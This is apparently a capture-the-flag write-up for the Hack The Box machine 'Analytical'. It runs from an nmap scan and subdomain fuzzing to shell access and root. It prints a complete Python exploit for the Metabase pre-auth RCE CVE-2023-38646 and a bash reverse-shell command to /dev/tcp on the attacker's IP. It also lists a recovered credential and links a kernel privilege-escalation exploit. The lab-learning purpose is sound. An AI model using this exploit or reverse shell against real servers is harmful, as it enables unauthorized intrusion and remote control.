
### Nmap result
```
sudo nmap -p- -sCV -A 10.10.11.233 -T4
[sudo] password for l4tmur: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-22 21:56 IST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.58% done
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 14.67% done; ETC: 21:57 (0:00:29 remaining)
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 95.67% done; ETC: 21:57 (0:00:01 remaining)
Nmap scan report for analytical.htb (10.10.11.233)
Host is up (0.049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Analytical
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=1/22%OT=22%CT=1%CU=36659%PV=Y%DS=2%DC=T%G=Y%TM=65AE977
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS                                                                                            
OS:(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST1                                                                                            
OS:1NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN                                                                                            
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A                                                                                            
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R                                                                                            
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F                                                                                            
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%                                                                                            
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD                                                                                            
OS:=S)                                                                                                                                                                 
                                                                                                                                                                       
Network Distance: 2 hops                                                                                                                                               
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                
                                                                                                                                                                       
TRACEROUTE (using port 80/tcp)                                                                                                                                         
HOP RTT      ADDRESS                                                                                                                                                   
1   49.63 ms 10.10.14.1                                                                                                                                                
2   49.90 ms analytical.htb (10.10.11.233)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.85 seconds

```

### /etc/hosts File
```
#Analytics

10.10.11.233 analytical.htb data.analytical.htb

```

### Subdomain enumeration

```
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 400,404,403,301,302 -H "Host: FUZZ.analytical.htb" -u http://analytical.htb/ -t 100

```

![[Pasted image 20240122230912.png]]

```
#Analytics

10.10.11.233 analytical.htb data.analytical.htb
```

Google it:

![[Pasted image 20240122231012.png]]

Search Metabase CVE, since it is easy machine :

![[Pasted image 20240122231050.png]]

### exploit Manual

```
`python3 main.py -u http://[targeturl] -t [setup-token] -c "[command]"`
```


```
python3 cve.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i &>/dev/tcp/10.10.14.138/1234 <&1"

```


```
from argparse import ArgumentParser
from string import ascii_uppercase

import base64
import random
import requests


def encode_command_to_b64(payload: str) -> str:
    encoded_payload = base64.b64encode(payload.encode('ascii')).decode()
    equals_count = encoded_payload.count('=')

    if equals_count >= 1:
        encoded_payload = base64.b64encode(f'{payload + " " * equals_count}'.encode('ascii')).decode()

    return encoded_payload


parser = ArgumentParser('Metabase Pre-Auth RCE Reverse Shell', 'This script causes a server running Metabase (< 0.46.6.1 for open-source edition and < 1.46.6.1 for enterprise edition) to execute a command through the security flaw described in CVE 2023-38646')

parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
parser.add_argument('-t', '--token', type=str, required=True, help='Setup Token from /api/session/properties')
parser.add_argument('-c', '--command', type=str, required=True, help='Command to be execute in the target host')

args = parser.parse_args()

print('[!] BE SURE TO BE LISTENING ON THE PORT YOU DEFINED IF YOU ARE ISSUING AN COMMAND TO GET REVERSE SHELL [!]\n')

print('[+] Initialized script')

print('[+] Encoding command')

command = encode_command_to_b64(args.command)

url = f'{args.url}/api/setup/validate'

headers = {
    "Content-Type": "application/json",
    "Connection": "close"
}

payload = {
    "token": args.token,
    "details": {
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER {random_string} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{command}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x".format(random_string = ''.join(random.choice(ascii_uppercase) for i in range(12)), command=command),
            "advanced-options": False,
            "ssl": True
        },
        "name": "x",
        "engine": "h2"
    }
}

print('[+] Making request')

request = requests.post(url, json=payload, headers=headers)

print('[+] Payload sent')
```

Get shell

![[Pasted image 20240122231201.png]]

Upload Linpeas :


![[Pasted image 20240122231217.png]]

```
metalytics : An4lytics_ds20223#
```

Got User :


### For root :

https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh

To embark on the journey towards obtaining the root flag, I initiated the **privilege escalation** process.

We Start with the ‘_uname -a_’ command that provides us with a summary of information about the system.

![[Pasted image 20240122231408.png]]
```
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux

```



And it’s a vulnerable kernel versions. :)


we upload it on the machine and run it in the low-priv shell:

![[Pasted image 20240122231507.png]]


And we Pawned the Machine. :)


Reference : https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability